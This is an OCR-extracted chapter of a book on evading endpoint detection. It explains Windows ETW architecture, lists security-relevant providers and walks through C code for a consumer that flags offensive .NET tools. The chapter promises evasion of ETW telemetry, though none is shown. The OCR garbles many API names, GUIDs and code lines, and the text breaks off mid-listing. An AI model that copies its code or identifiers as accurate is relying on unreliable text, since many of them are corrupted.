## 8 EVENT TRACING FOR WINDOWS

![Figure](figures/EvadingEDR_page_169_figure_001.png)

Using the Event Tracing for Windows (ETW) logging facility, developers can program their applications to emit events, consume events from other components,

and control event-tracing sessions. This allows them to trace the execution of their code and monitor or debug potential issues. It may be helpful to think of ETW as an alternative to printf -based debugging; the messages are emitted over a common channel using a standard format rather than printed to the console.

In a security context, ETW provides valuable telemetry that wouldn't otherwise be available to an endpoint agent. For example, the common language runtime, which is loaded into every .NET process, emits unique events using ETW that can provide more insight than any other mechanism into the nature of managed code executing on the host. This allows an EDR agent to collect novel data from which to create new alerts or enrich existing events.

---

ETW is rarely praised for its simplicity and ease of use, thanks in no small part to the tremendously complicated technical documentation that Microsoft provides for it. Luckily, while ETW's inner workings and implementation details are fascinating, you don't need a full understanding of its architecture. This chapter covers the parts of ETW that are relevant to those interested in telemetry. We'll walk through how an agent might collect telemetry from ETW and how to evade this collection.

## Architecture

There are three main components involved in ETW: providers, consumers, and controllers. Each of these components serves a distinct purpose in an event-tracing session. The following overview describes how each component fits into the larger ETW architecture.

### Providers

Simply put, providers are the software components that emit events. These might include parts of the system, such as the Task Scheduler, a third-party application, or even the kernel itself. Generally, the provider isn't a separate application or image but rather the primary image associated with the component.

When this provider image follows some interesting or concerning code path, the developer can opt to have it emit an event related to its execution. For example, if the application handles user authentication, it might emit an event whenever authentication fails. These events contain any data the developer deems necessary to debug or monitor the application, ranging from a simple string to complex structures.

ETW providers have GUIDs that other software can use to identify them. In addition, providers have more user-friendly names, most often defined in their manifest, that allow humans to identify them more easily. There are around 1,100 providers registered in default Windows 10 installations. Table 8-1 includes those that endpoint security products might find helpful.

Table 8-1: Default ETW Providers Relevant to Security Monitoring

<table><tr><td>Provider name</td><td>GUID</td><td>Description</td></tr><tr><td>Microsoft-Antimalware-Scan-Interface</td><td>[2A576B87-09A7-520E-C21A-4942F0271D67]</td><td>Supplies details about the data passed through the Antimalware Scan Interface (AMSI)</td></tr><tr><td>Microsoft-Windows-DotNETruntime</td><td>[E13C0D23-CCBC-4E12-931B-D9C2C2EE27E4]</td><td>Provides events related to .NET assemblies executing on the local host</td></tr><tr><td>Microsoft-WindowsAudit-CVE</td><td>[85A6A2AD02-EE17-485F-9D4F-7494287193A6]</td><td>Provides a mechanism for software to report attempts to exploit known vulnerabilities</td></tr><tr><td>Microsoft-Windows-DNS-Client</td><td>[1C95126E-7EEA-49A9-A3FE-A37BB03DDBAD]</td><td>Details the results of domain name resolution on the host</td></tr></table>

144 Chapter 8

---

<table><tr><td>Provider name</td><td>GUID</td><td>Description</td></tr><tr><td>Microsoft-Windows-Kernel-Process</td><td>(22FB2CD6-0E7B-4228-A0C7-2FAD1FD0E716)</td><td>Provides information related to the creation and termination of processes (similar to what a driver can obtain using a process-creation callback routine)</td></tr><tr><td>Microsoft-Windows-PowerShell</td><td>(A0C18538-5C40-4B15-8766-3CF1C58F985A)</td><td>Provides PowerShell script block-logging functionality</td></tr><tr><td>Microsoft-Windows-RPC</td><td>(46D52B32D-D609-4BE9-AE07-CEBDAE937E39)</td><td>Contains information related to RPC operations on the local system</td></tr><tr><td>Microsoft-Windows-Security-Kerberos</td><td>(98E6CFCBF-E00A-41EO-A57B-622D4E1830B1)</td><td>Provides information related to Kerberos authentication on the host</td></tr><tr><td>Microsoft-Windows-Services</td><td>(00637158-EEDA-4007-9429-AD526462696)</td><td>Emits events related to the installation, operation, and removal of services</td></tr><tr><td>Microsoft-Windows-SmartScreen</td><td>(3CB2A168-FE34-4AE4-BDAD-DCF422F34473)</td><td>Provides events related to Microsoft Defender SmartScreen and its interaction with files downloaded from the internet</td></tr><tr><td>Microsoft-Windows-TaskScheduler</td><td>(DE7824EA-73C8-4A09-985D-5BDADCFA9017)</td><td>Supplies information related to scheduled tasks</td></tr><tr><td>Microsoft-Windows-WebIO</td><td>(50B3E73C-0370-461D-8B9F-26F32D68887D)</td><td>Provides visibility into web requests being made by users of the system</td></tr><tr><td>Microsoft-Windows-WMI-Activity</td><td>(1418E04-8084-4623-B7FE-D74AB47BDDAA)</td><td>Supplies telemetry related to the operation of WMI, including event subscriptions</td></tr></table>

ETW providers are securable objects, meaning a security descriptor can be applied to them. A security descriptor provides a way for Windows to restrict access to the object through a discretionary access control list or log access attempts via a system access control list. Listing 8-1 shows the security descriptor applied to the Microsoft-Windows-Services provider.

```bash
PS > $SDs = Get-ItemProperty -Path HKLM:\System\CurrentControlSet\Control\WMI\Security
PS > $sddl = {[WikiClass]\'Win32_SecurityDescriptorHelper'}.~>.BinarySDToSDDL($SDs.'0063715b-eeda-4007-9429-ad526f62696e').~>.SDDL~PS > ConvertFrom-SddlString -$Sddl $sddl
Owner        : BUILTIN\Administrators
Group        : BUILTIN\Administrators
DiscretionaryACL : {NT AUTHORITY\SYSTEM: AccessAllowed,
                          NT AUTHORITY\LOCAL_SERVICE: AccessAllowed,
                          BUILTIN\Administrators: AccessAllowed}
SystemACL       :
RawDescriptor    : System.Security.AccessControl.CommonSecurityDescriptor
```

Listing 8-1: Evaluating the security descriptor applied to a provider

---

This command parses the binary security descriptor from the provider's registry configuration using its GUID. It then uses the 0x032 \_Security@scriptorHelper WMI class to convert the byte array in the registry to a security descriptor definition language string. This string is then passed to the PowerShell cmdlet ConvertFrom-SddString to return the human-readable details of the security descriptor. By default, this security descriptor only allows access to NT AUTHORITYSSYSTEM, NT AUTHORITYLOCAL_SERVICE, and members of the local Administrator group. This means that controller code must be running as admin to directly interact with providers.

## Emitting Events

Currently, four main technologies allow developers to emit events from their provider applications:

## Managed Object Format (MOF)

MOF is the language used to define events so that consumers know how to ingest and process them. To register and write events using MOF, providers use the sechost!RegisterTraceGuids() and adapt!TraceEvent() functions, respectively.

## Windows Software Trace Preprocessor (WTP)

Like the Windows Event Log, WPP is a system that lets the provider log an event ID and event data, initially in binary but later formatted to be human readable. WPP supports more complex data types than MOF, including timestamps and GUIDs, and acts as a supplement to MOFbased providers. Like MOF-based providers, WPP providers use the scohost!RegisterTraceGuids() and advapi!TraceEvent() functions to register and write events. WPP providers can also use the WPP_INT_TRACEID macro to register the provider GUID.

## Manifests

Manifests are XML files containing the elements that define the provider, including details about the format of events and the provider itself. These manifests are embedded in the provider binary at compilation time and registered with the system. Providers that use manifests rely on the addv1!EventRegister() function to register events and addv1!EventWrite() to write them. Today, this seems to be the most common way to register providers, especially those that ship with Windows.

## TraceLogging

Introduced in Windows 10, TraceLogging is the newest technology for providing events. Unlike the other technologies, TraceLogging allows for self-describing events, meaning that no class or manifest needs to be registered with the system for the consumer to know how to process them. The consumer uses the Trace Data Helper (TDH) APIs to

146 Chapter 8

---

decode and work with events. These providers use adapt(TraceLogging

Register() and adapt(TraceLoggingIngrite()) to register and write events.

Regardless of which method a developer chooses, the result is the same: events being emitted by their application for consumption by other applications.

## Locating Event Sources

To understand why a provider is emitting certain events, it's often helpful to look at the provider itself. Unfortunately, Windows doesn't provide an easy way to translate a provider's name or GUID into an image on disk. You can sometimes collect this information from the event's metadata, but in many cases, such as when the event source is a DLL or a driver, discovering it requires more effort. In these situations, try considering the following attributes of ETW providers:

- • The provider's .PE file must reference its GUID, most commonly in the
  .sdata section, which holds read-only initialized data.
  • The provider must be an executable code file, typically a .exe, .dll, or .sys .
  • The provider must call a registration API (specifically, advapiIEvent
  Register() or mdtllflteEventRegister() for user-mode applications and
  ntoskrnlFlteRegister() for kernel-mode components).
  • If using a manifest registered with the system, the provider image will
  be in the ResourceFileName value in the registry key HKLM\SOFTWARE\
  Microsoft\Windows\CurrentVersion\WINENT\Publishers\<PROPERTY_GUID>.
  This file will contain a WEV7_TEMPLATE resource, which is the binary
  representation of the manifest.
  You could conduct a scan of files on the operating system and return those that satisfy these requirements. The FindETWProviderImage open source tool available on GitHub makes this process easy. Listing 8.2 uses it to locate images that reference the GUID of the Microsoft-WindowsTaskScheduler provider.

```bash
PS > \FindTWMProviderImage.exe "Microsoft-Windows-TaskScheduler" "C:\Windows\System32" "
Translated Microsoft-Windows-TaskScheduler to {de7b24ea-73c8-4a09-985d-5bdadcf9017}
Found provider in the registry: C:\WINDOWS\system32\schedsvc.dll
Searching 5486 files for {de7b24ea-73c8-4a09-985d-5bdadcf9017} ...
Target File: C:\Windows\System32\aitstatic.exe
Registration Function Imported: True
Found 1 reference:
  1) Offset: 0x2d8330 RVA: 0x2d8330 (.data)
Target File: C:\Windows\System32\schedsvc.dll
Registration Function Imported: True
Found 2 references:
  1) Offset: 0x6cb78 RVA: 0x6d778 (.rdata)
  2) Offset: 0xab910 RVA: 0xaf110 (.pdata)
```

---

```bash
Target file: C:\Windows\System32\taskcomp.dll
Registration Function Imported: False
Found 1 reference:
  1) Offset: 0x39690 RVA: 0x3aa30 (.rdata)
Target file: C:\Windows\System32\ubpm.dll
Registration Function Imported: True
Found 1 reference:
  1) Offset: 0x38288 RVA: 0x39a88 (.rdata)
Total References: 5
Time Elapsed: 1.168 seconds
```

Listing 8-2: Using FindETWProviderImage to locate provider binaries

If you consider the output, you'll see that this approach has some gaps. For example, the tool returned the true provider of the events, schedlist.dll , but also three other images. These false positives might occur because images consume events from the target provider and so contain the provider's GUID, or because they produce their own events and so import one of the registration APIs. This method might also produce false negatives; for example, when the source of an event is ntksrnl.exe , the image won't be found in the registry or import either of the registration functions.

To confirm the identity of the provider, you must investigate an image further. You can do this using a relatively simple methodology. In a disassembler, navigate to the offset or relative virtual address reported by

FindTWPProviderImage and look for any references to the GUID coming from a function that calls a registration API. You should see the address of the GUID being passed to the registration function in the RCX register, as shown in Listing 8-3.

```bash
schedsvcJobsService::Initialize=0xcc:
00007ffc74096f5c 483e9350a0800 mov     dword ptr [schedsvc_pEventManager],rsi
00007fff74096f63 4c8bce      mov     y9,rsi
00007fff74096f66 4533c0      xor    r8d,r8d
00007fff74096f69 33d2      xor    edx,edx
00007fff74096f6b 488dd0d6680400  lea    rxc,[schedsvcTASKSCHED] ●
00007fff74096f72 4ff150f570400  call     dword ptr [schedsvc_imp_etwEventRegister ♦
00007fff74096f79 0f41f440000   nop    dword ptr [tax+ax]
00007fff74096f7e 8bf8      mov     edl,eax
00007fff74096f80 48391e      cmp     dword ptr [resj],tbx
00007fff74096f83 0f41f493f0100  ¡e    schedsvcJobsService::Initialize=0x14022
```

Listing 8-3. Disassembly of the provider registration function inside schedsvc.dll

In this disassembly, there are two instructions of interest to us. The first is the address of the provider GUID being loaded into RCX 0. This is immediately followed by a call to the imported dtl11@tEventRegister() function ❹ to register the provider with the operating system.

---

### Figuring Out Why an Event Was Emitted

At this point, you've identified the provider. From here, many detection engineers begin looking into what conditions triggered the provider to emit the event. The details of this process are outside the scope of this book, as they can differ substantially based on the provider, although we'll cover the topic in greater depth in Chapter 12. Typically, however, the workflow looks as follows.

In a disassembler, mark the RECHANGEAND returned from the event registration API, then look for references to this RECHANGEAND from a function that writes ETW events, such as mtoScrollIttWrite(). Step through the function, looking for the source of the UserData parameter passed to it. Follow execution from this source to the event-writing function, checking for conditional branches that would prevent the event from being emitted. Repeat these steps for each unique reference to the global RECHANGEAND.

## Controllers

Controllers are the components that define and control trace sessions, which record events written by providers and flush them to the event consumers. The controller's job includes starting and stopping sessions, enabling or disabling providers associated with a session, and managing the size of the event buffer pool, among other things. A single application might contain both controller and consumer code; alternatively, the controller can be a separate application entirely, as in the case of Xperf and logman, two utilities that facilitate collecting and processing EW events.

Controllers create trace sessions using the sechost!StartTrace() API and configure them using sechost!ControlTrace() and adap!EnableTraceEx() or sechost!EnableTraceEx2(). On Windows XP and later, controllers can start and manage a maximum of 64 simultaneous trace sessions. To view these trace sessions, use logman, as shown in Listing 8-4.

```bash
PS > logman.exe query -ets
Data Collector Set                     Type               Status
-----------------------------------------------------------------------
AppModel                          Trace             Running
BioEnrolment                       Trace             Running
Diagtrack-Listener                 Trace             Running
FaceCredProv                       Trace             Running
FaceTel                          Trace             Running
LwtNetLog                       Trace             Running
Microsoft-Windows-Rdp-Graphics-RdpIdd-Trace Trace     Running
NetCore                          Trace             Running
NtsfLog                          Trace             Running
RadioMgr                          Trace             Running
WiFiDriverIHVSession                Trace             Running
WiFiSession                       Trace             Running
```

Event Tracing for Windows 149

---

```bash
UserNotPresentTraceSession             Trace      Running
NOCAT                          Trace      Running
Admin_PS_Provider                 Trace      Running
WindowsUpdate_trace_log           Trace      Running
MyWppTracing-20220120-151932-0000003-ffffffff Trace Running
SHS-012022-151937-7-7f               Trace      Running
SgrMtwSession                     Trace      Running
```

Listing 8-4: Enumerating trace sessions with logman.exe

Each name under the Data Collector Set column represents a unique controller with its own subordinate trace sessions. The controllers shown in Listing 8-4 are built into Windows, as the operating system also makes heavy use of ETW for activity monitoring.

Controllers can also query existing traces to get information. Listing 8-5 shows this in action.

```bash
PS > logman.exe query EventLog-System -ets
Name:
        EventLog-System
Status:
        Running
Root Path:
    %systemdrive%\PerfLogs\Admin
Segment:
        Off
Schedules:
        On
Segment Max Size:
        100 MB
Name:
        EventLog-System\EventLog-System
Type:
        Trace
Append:
        Off
Circular:
        Off
Overwrite:
        Off
Buffer Size:
        64
Buffers Lost:
        0
Buffers Written:
        155
Buffer Flush Timer:
        1
Clock Type:
        System
File Mode:
        Real-time
Provider:
Name:
        Microsoft-Windows-FunctionDiscoveryHost
Provider Guid:
        {538CBBAD-4877-4EB2-B26E-7CAEEBFOF8CB}
Level:
        255
KeywordsAll:
        0x0
KeywordsAny:
        0x8000000000000000 (System)
Properties:
        65
Filter Type:
        0
Provider:
Name:
        Microsoft-Windows-Subsys-SMSS
Provider Guid:
        {43E63DA5-41D1-4FBF-ADED-1BBED98FD01D}
Level:
        255
KeywordsAll:
        0x0
KeywordsAny:
        0x4000000000000000 (System)
```

150 Chapter 8

---

```bash
Properties:        65
Filter Type:        0
--snip--
```

Listing 8-5: Using logman.exe to query a specific trace

This query provides us with information about the providers enabled in the session ❷ and the filtering keywords in use ❸ , whether it is a real-time or file-based trace ❹ , and performance figures. With this information, we can start to understand whether the trace is a form of performance monitoring or telemetry collection by an EDR.

### Consumers

Consumers are the software components that receive events after they've been recorded by a trace session. They can either read events from a logfile or disk or consume them in real time. Because nearly every EDR agent is a real-time consumer, we'll focus exclusively on those.

Consumers use sechost!openTrace() to connect to the real-time session and sechost!ProcessTrace() to start consuming events from it. Each time the consumer receives a new event, an internally defined callback function parses the event data based on information supplied by the provider, such as the event manifest. The consumer can then choose to do whatever it likes with the information. In the case of endpoint security software, this may mean creating an alert, taking some preventive actions, or correlating the activity with telemetry collected by another sensor.

## Creating a Consumer to Identify Malicious .NET Assemblies

Let's walk through the process of developing a consumer and working with events. In this section, we'll identify the use of malicious in-memory .NET framework assemblies, such as those employed by Cobalt Strike's Beacon execute-assembly functionality. One strategy for identifying these assemblies is to look for class names belonging to known offensive C# projects. Although attackers can easily defeat this technique by changing the names of their malware's classes and methods, it can be an effective way to identify the use of unmodified tools by less sophisticated actors.

Our consumer will ingest filtered events from the Microsoft-WindowsDotNETruntime provider, specifically watching for classes associated with Seatbelt, a post-exploitation Windows reconnaissance tool.

### Creating a Trace Session

To begin consuming events, we must first create a trace session using the

eachostStartTrace() API. This function takes a pointer to an EVENT_TRACE \_PROPERTIES structure, defined in Listing 8-6. (On systems running versions of Windows later than 1703, the function could choose to take a pointer to an EVENT_TRACE_PROPERTIES_V2 structure instead.)

Event Tracing for Windows 151

---

```bash
typedef struct _EVENT_TRACE_PROPERTIES {
  WNODE_HEADER Wnode;
  ULONG     BufferSize;
  ULONG     MinimumBuffers;
  ULONG     MaximumBuffers;
  ULONG     MaximumFileSize;
  ULONG     LogFileMode;
  ULONG     FlushTimer;
  ULONG     EnableFlags;
  union {
    LONG AgeLimit;
    LONG FlushThreshold;
  } DUMMYUNIONNAME;
  ULONG     NumberOfBuffers;
  ULONG     FreeBuffers;
  ULONG     EventLosst;
  ULONG     BuffersWritten;
  ULONG     LogBuffersCost;
  ULONG     RealTimeBuffersLost;
  HANDLE LoggerThreadId;
  ULONG     LogFileNameOffset;
  ULONG     LoggerNameOffset;
  } EVENT_TRACE_PROPERTIES, *PEVENT_TRACE_PROPERTIES;
```

Listing 8-6: The EVENT_TRACE_PROPERTIES structure definition

This structure describes the trace session. The consumer will populate it and pass it to a function that starts the trace session, as shown in Listing 8-7 .

```bash
static const GUID g_sessionGuid =
  { 0x0b0e0c0c, 0xbc0d9, 0x49eb,
  { 0xae, 0xcc, 0x42, 0x45, 0x1, 0x2f, 0x97, 0xa9 }
}; static const WCHAR g_sessionName[] = L"DotNETEventConsumer";
int main()
  ULONG ulBufferSize =
      sizeof(EVENT_TRACE_PROPERTIES) + sizeof(g_sessionName);
  PEVENT_TRACE_PROPERTIES pTraceProperties =
      (PEVENT_TRACE_PROPERTIES)malloc(ulBufferSize);
  if (!pTraceProperties)
    return ERROR_OUTOFMEMORY;
  }
  ZeroMemory(pTraceProperties, ulBufferSize);
  pTraceProperties->Wnode.BufferSize = ulBufferSize;
  pTraceProperties->Wnode.Flags = WNODE_FLAG_TRACE_GUID;
  pTraceProperties->Wnode.ClientContext = 1;
  pTraceProperties->Wnode.Guid = g_sessionGuid;
  pTraceProperties->pLogMode = EVENT_TRACE_REAL_TIME_MODE;
  pTraceProperties->pLoggerNameOffset = sizeof(EVENT_TRACE_PROPERTIES);
```

152 Chapter B

---

```bash
wcscpy_s(
      {PMACHAR)(pTraceProperties + 1),
      wcslen(g_sessionName) + 1,
      g_session;
    DWORD dwStatus = 0;
    TRACEHANDLE hTrace = NULL;
    while (TRUE) {
      dwStatus = StartTraceW(
          &hTrace,
          g_sessionName,
          pTraceProperties);
      if (dwStatus == ERROR_ALREADY_EXISTS)
      {
        dwStatus = ControlTraceW(
            hTrace,
            g_sessionName,
            pTraceProperties,
            EVENT_TRACE_CONTROL_STOP);
      }
    if (dwStatus != ERROR_SUCCESS)
        {
          return dwStatus;
    }
  --snip--
}
```

Listing 8-7: Configuring trace properties

We populate the WNODE_HEADER structure pointed to in the trace properties. Note that the GUID member contains the GUID of the trace session, not of the desired provider. Additionally, the LogFileMode member of the trace properties structure is usually set to EVENT_TRACE_REAL_TIME_MODE to enable real-time event tracing.

## Enabling Providers

The trace session isn't yet collecting events, as no providers have been enabled for it. To add providers, we use the sechost!EnableTraceXe() API. This function takes the TRACEHANDLE returned earlier as a parameter and is defined in Listing 8-8.

```bash
ULONG WMIAPI EnableTraceEx2(
[in]             TRACEHANDLE,                TraceHandle,
[in]             LPCGUID,                 ProviderId,
[in]             ULONG,                   ControlCode,
[in]             UCHAR,                       Level,
[in]             ULONGLONG,                MatchAnyKeyword,
[in]             ULONGLONG,                MatchAllKeyword,
```

Event Tracing for Windows 153

---

```bash
[in]        ULONG            Timeout,
[in, optional] PENABLE_TRACE_PARAMETERS EnableParameters
);
```

Listing 8-8: The sechost!EnableTraceEx2() function definition

The ProviderId parameter is the target provider's GUID, and the Level parameter determines the severity of the events passed to the consumer. It can range from TRACE_LEVEL_VERBOSE (5) to TRACE_LEVEL_CRITICAL (1). The consumer will receive any events whose level is less than or equal to the specified value.

The MatchAnyKeyword parameter is a bitmask that allows an event to be written only if the event's keyword bits match all the bits set in this value (or if the event has no keyword bits set). In most cases, this member is set to zero. The MatchAnyKeyword parameter is a bitmask that allows an event to be written only if the event's keyword bits match any of the bits set in this value.

The EnableParameters parameter allows the consumer to receive one or more extended data items in each event, including but not limited to the following:

EVENT_ENABLE_PROPERTY_PROCESS_START_KEY A sequence number that identifies the process, guaranteed to be unique to the current boot session EVENT_ENABLE_PROPERTY_SID The security identifier of the principal, such as a user of the system, under which the event was emitted EVENT_ENABLE_PROPERTY_TS_ID The terminal session identifier under which the event was emitted EVENT_ENABLE_PROPERTY_STACK_TRACE Value that adds a call stack if the event was written using the advapiEventWrite() API

The sechost!EnableTraceX() API can add any number of providers to a trace session, each with its own filtering configurations. Listing 8-9 continues the code in Listing 8-7 by demonstrating how this API is commonly used.

```bash
# static const GUID g_providerGuid =
  { 0x1e30d23, 0xccbc, 0x4e12,
  { 0x93, 0x1b, 0xd9, 0xcc, 0x2e, 0xee, 0x27, 0xe4 }
  };
  int main()
  {
    --snip--
     dwStatus = EnableTraceEx2(
        hTrace,
        &g_providerGuid,
        EVENT_CONTROL_CODE_ENABLE_PROVIDER,
        TRACE_LEVEL_INFORMATION,
      0x2038,
        0,
        INFINITE,
        NULL);
```

154 Chapter 8

---

```bash
if (dwStatus != ERROR_SUCCESS)
    {
        goto cleanup;
    }
  --snip--
```

Listing 8-9: Configuring a provider for the trace session

We add the Microsoft-Windows-DotNETRuntime provider ❶ to the trace session and set MatchAnykeyword to use the Interop (0x2000), NGen(0x20), Jitt (0x10), and Loader (0x8) keywords ❷. These keywords allow us to filter out events that we're not interested in and collect only those relevant to what we're trying to monitor.

## Starting the Trace Session

After we've completed all of these preparatory steps, we can start the trace session. To do so, an EDR agent would call sechoset!openTrace() with a pointer to an EVENT_TRACE_LOGFILE, defined in Listing 8-10, as its only parameter.

```bash
typedef struct _EVENT_TRACE_LOGFILEM {
    LPWSTR                LogFileName;
    LPWSTR                LoggerName;
    LONGLONG               CurrentTime;
    ULONG                 BuffersRead;
  union {
    ULONG LogFileMode;
    ULONG ProcessTraceMode;
  } DUMMYUNIONNAME;
  EVENT_TRACE                CurrentEvent;
  TRACE_LOGFILE_HEADER      LogfileHeader;
  PEVENT_TRACE_BUFFER_CALLBACKW BufferCallback;
  ULONG                 BufferSize;
  ULONG                 Filled;
  ULONG                 EventsLost;
  union {
    PEVENT_CALLBACK        EventCallback;
    PEVENT_RECORD_CALLBACK EventRecordCallback;
  } DUMMYUNIONNAME2;
  ULONG                 IsKernelTrace;
  PVOID             Context;
  } EVENT_TRACE_LOGFILEW, *PEVENT_TRACE_LOGFILEW;
```

Listing 8-10: The EVENT_TRACE_LOGFILE structure definition

Listing 8-11 demonstrates how to use this structure.

```bash
int main()
{
    --snip--
   EVENT_TRACE_LOGFILEW etl = { 0 };
```

Event Tracing for Windows 155

---

```bash
● etl.LoggerName = g_sessionName;
  ● etl.ProcessTraceMode = PROCESS_TRACE_MODE_EVENT_RECORD |
                      PROCESS_TRACE_MODE_REAL_TIME;
  ● etl.EventRecordCallback = OnEvent;
    TRACEHANDLE hSession = NULL;
    hSession = OpenTrace(&etl);
    if (hSession == INVALID_PROCESSTRACE_HANDLE)
      {
        goto Cleanup;
      }
    --snip--
```

Listing 8-11: Passing the EVENT_TRACE_LOGFILE structure to sechost!OpenTrace()

While this is a relatively large structure, only three of the members are immediately relevant to us. The tagName member is the name of the trace session, O, and ProcessTraceMode is a bitmask containing the values for

PROCESS_TRACE_MODE_EVENT_RECORD (0x10000000), to indicate that events should use the EVENT_RECORD format introduced in Windows Vista, as well as PROCESS TRACE_MODE_REAL_TIME (0x100), to indicate that events should be received in real time O. Lastly, EventRecordCallback is a pointer to the internal callback function O (covered shortly) that ETW calls for each new event, passing it an EVEN_RECORD structure.

When sechost!openTrace() completes, it returns a new TRACEHANDLE (hSession, in our example). We can then pass this handle to sechost!Process Trace(), as shown in Listing 8-12, to start processing events.

```bash
void ProcessEvents(PTRACEHANDLE phSession)
{
   FILETIME now;
   ● GetSystemTimeAsFileTime(&now);
      ProcessTrace(phSession, 1, &now, NULL);
}
int main()
{
  --snip--
   HANDLE hThread = NULL;
 ● hThread = CreateThread(
                          NULL, 0,
                          ProcessEvents,
                          &hSession,
                          0, NULL);
   if (!hThread)
     {
       goto Cleanup;
     }
```

156 Chapter 8

---

```bash
--snip--
  }
```

Listing 8-12: Creating the thread to process events

We pass the current system time ❶ to sechost!ProcessTrace() to tell the system that we want to capture events occurring after this time only. When called, this function will take control of the current thread, so to avoid completely blocking the rest of the application, we create a new thread ❷ just for the trace session.

Assuming no errors were returned, events should start flowing from the provider to the consumer, where they'll be processed by the internal callback function specified in the EventRecordCallback member of the EVENT_TRACE_LOGFILE structure. We'll cover this function in "Processing Events" on page 158.

## Stopping the Trace Session

Finally, we need a way to stop the trace as needed. One way to do this is to use a global Boolean value that we can flip when we need the trace to stop, but any technique that signals a thread to exit would work. However, if an outside user can invoke the method used (in the case of an unchecked RPC function, for example), a malicious user might be able to stop the agent from collecting events via the trace session altogether. Listing 8-13 shows how stopping the trace might work.

```bash
HANDLE g_hStop = NULL;
BOOL ConsoleCtrlHandler(DWORD dwCtrlType)
{
  ● if (dwCtrlType == CTRL_C_EVENT) {
     ● SetEvent(g_hStop);
     return TRUE;
  }
    return FALSE;
}
int main()
{
  --snip--
   g_hStop = CreateEvent(NULL, TRUE, FALSE, NULL);
   SetConsoleCtrlHandler(ConsoleCtrlHandler, TRUE);
   WaitForSingleObject(g_hStop, INFINITE);
  ● CloseTrace(hSession);
   WaitForSingleObject(hThread, INFINITE);
   CloseHandle(g_hStop);
   CloseHandle(hThread);
Event Tracing for Windows  157
```

---

```bash
return dwStatus
}
```

Listing 8-13: Using a console control handler to signal a thread exit

In this example, we use an internal console control handler routine, ConsoleCtrlHandle(), and an event object that watches for the CTRL-C keyboard combination ❶ . When the handler observes this keyboard combination, the internal function notifies the event object ❷ , a synchronization object commonly used to tell a thread that some event has occurred, and returns. Because the event object has been signaled, the application resumes its execution and closes the trace session ❸ .

## Processing Events

When the consumer thread receives a new event, its callback function

(@Event{}) in our example code) is invoked with a pointer to an EVENT_RECORD structure. This structure, defined in Listing 8-14, represents the entirety of the event.

```bash
typedef struct _EVENT_RECORD {
    EVENT_HEADER                 EventHeader;
    ETM_BUFFER_CONTEXT             BufferContext;
    USHORT                    ExtendedDataCount;
    USHORT                    UserDataLength;
    PEVENT_HEADER_EXTENDED_DATA_ITEM  ExtendedData;
    PVOID                    UserData;
    PVOID                    UserContext;
} EVENT_RECORD, *PEVENT_RECORD;
```

Listing 8-14: The EVENT_RECORD structure definition

This structure might seem simple at first glance, but it could contain a huge amount of information. The first field, EventHeader, loads basic event metadata, such as the process ID of the provider binary; a timestamp; and an EVENT_DESCRIPTOR, which describes the event itself in detail. The ExtendedData member matches the data passed in the EnableProperty parameter of sechost!EnableTrace6x(). This field is a pointer to an EVENT_HEADER \_EXTENDED_DATA_ITEM, defined in Listing 8-15.

```bash
typedef struct _EVENT_HEADER_EXTENDED_DATA_ITEM {
  USHORT    Reserved1;
  USHORT    ExtType;
  struct {
    USHORT Linkage : 1;
    USHORT Reserved2 : 15;
  };
  USHORT    DataSize;
  ULONGLONG DataPtr;
  } EVENT_HEADER_EXTENDED_DATA_ITEM, *PEVENT_HEADER_EXTENDED_DATA_ITEM;
```

Listing 8-15: The EVENT_HEADER_EXTENDED_DATA_ITEM structure definition

158 Chapter 8

---

The fxttype member contains an identifier (defined in eventcons.h and shown in Listing 8-16) that tells the consumer to which data type the dataPtr member points. Note that a significant number of values defined in the headers are not formally supported for the callers of the API in Microsoft's documentation.

```bash
#define EVENT_HEADER_EXT_TYPE_RELATED_ACTIVITYID   0x0001
#define EVENT_HEADER_EXT_TYPE_SID      0x0002
#define EVENT_HEADER_EXT_TYPE_TS_ID       0x0003
#define EVENT_HEADER_EXT_TYPE_INSTANCE_INFO   0x0004
#define EVENT_HEADER_EXT_TYPE_STACK_TRACE32    0x0005
#define EVENT_HEADER_EXT_TYPE_STACK_TRACE64    0x0006
#define EVENT_HEADER_EXT_TYPE_PEBS_INDEX       0x0007
#define EVENT_HEADER_EXT_TYPE_PMC_COUNTERS      0x0008
#define EVENT_HEADER_EXT_TYPE_PSM_KEY        0x0009
#define EVENT_HEADER_EXT_TYPE_EVENT_KEY        0x000A
#define EVENT_HEADER_EXT_TYPE_EVENT_SCHEMA_TL      0x000B
#define EVENT_HEADER_EXT_TYPE_PROV_TRAITS        0x000C
#define EVENT_HEADER_EXT_TYPE_PROCESS_START_KEY   0x000D
#define EVENT_HEADER_EXT_TYPE_CONTROL_GUID       0x000E
#define EVENT_HEADER_EXT_TYPE_QPC_DELTA           0x000F
#define EVENT_HEADER_EXT_TYPE_CONTAINER_ID       0x0010
#define EVENT_HEADER_EXT_TYPE_MAX              0x0011
```

Listing 8-16: The EVENT_HEADER_EXT_TYPE constants

This ExtendedData member of the EVENT_RECORD contains valuable data, but agents typically use it to supplement other sources, particularly the UserData member of the EVENT_RECORD. This is where things get a little tricky, as Microsoft states that, in almost all cases, we must retrieve this data using the TDH APIs.

We'll walk through this process in our callback function, but keep in mind that this example represents only one approach to extracting relevant information and may not reflect production code. To begin processing the event data, the agent calls tdh!TdhGetEventInformation(), as shown in Listing 8-17.

```bash
void CALLBACK OnEvent(PEVENT_RECORD pRecord)
{
  ULONG ulSize = 0;
  DWORD dwStatus = 0;
  PBYTE pUserData = (PBYTE)pRecord->UserData;
  dwStatus = TdhGetEventInformation(pRecord, 0, NULL, NULL, &ulSize);
  TRACE_EVENT_INFO pEventInfo = (TRACE_EVENT_INFO)malloc(ulSize);
  if (!pEventInfo)
  {
      // Exit immediately if we're out of memory
      ExitProcess(ERROR_OUTOFMEMORY);
  }
  dwStatus = TdhGetEventInformation(
      pRecord,
        Event Tracing for Windows 159
```

---

```bash
0,
        NULL,
        pEventInfo,
        0u1Size};
   if (dwStatus != ERROR_SUCCESS)
    {      return;
    }
    --snip--
```

Listing 8-17: Beginning to process event data

After allocating memory of the required size, we pass a pointer to a

TRACE_EVENT_INFO structure, as the first parameter to the function. Listing 8-18 defines this structure.

```bash
typedef struct _TRACE EVENT_INFO {
    GUID                ProviderGuid;
    GUID                EventGuid;
    EVENT_DESCRIPTOR      EventDescriptor;
● DECODING_SOURCE      DecodingSource;
    ULONG                ProviderNameOffset;
    ULONG                LevelNameOffset;
    ULONG                ChannelNameOffset;
    ULONG                KeywordsNameOffset;
    ULONG                TaskNameOffset;
    ULONG                OpcodeNameOffset;
    ULONG                EventMessageOffset;
    ULONG                ProviderMessageOffset;
    ULONG                BinaryXMLOffset;
